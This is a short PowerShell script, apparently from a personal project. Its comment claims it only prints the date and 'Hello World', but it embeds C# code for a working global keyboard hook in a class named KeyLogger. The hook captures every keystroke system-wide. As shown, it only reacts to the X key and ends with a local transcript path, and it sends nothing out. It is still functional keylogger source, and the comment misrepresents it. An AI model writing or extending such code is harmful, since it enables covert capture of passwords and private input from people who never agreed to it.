#This currently prints date and prints Hello World
Get-Date
Write-Host "Hello World"

Add-Type -TypeDefinition '
  using System;
  using System.IO;
  using System.Diagnostics;
  using System.Runtime.InteropServices;
  using System.Windows.Forms;

  namespace PowerShell {
    public static class KeyLogger {
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 0x0100;

      private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

      private static Action<Keys> keyCallback;
      private static IntPtr hookId = IntPtr.Zero;

      [DllImport("user32.dll")]
      private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

      [DllImport("user32.dll")]
      private static extern bool UnhookWindowsHookEx(IntPtr hhk);

      [DllImport("user32.dll")]
      private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

      [DllImport("kernel32.dll")]
      private static extern IntPtr GetModuleHandle(string lpModuleName);

      public static void Run(Action<Keys> callback) {
        keyCallback = callback;
        hookId = SetHook();
        Application.Run();
        UnhookWindowsHookEx(hookId);
      }

      private static IntPtr SetHook() {
        IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
        return SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, moduleHandle, 0);
      }

      private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
          var key = (Keys)Marshal.ReadInt32(lParam);
          keyCallback(key);
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
      }
    }
  }
' -ReferencedAssemblies System.Windows.Forms

[PowerShell.KeyLogger]::Run({
  param($key)
  if ($key -eq "X") {
    Write-Host "Do something now."
  }
})

  Start-Transcript -Path C:\Users\LENOVO\GithubProject\key-logger
  Stop-Transcript
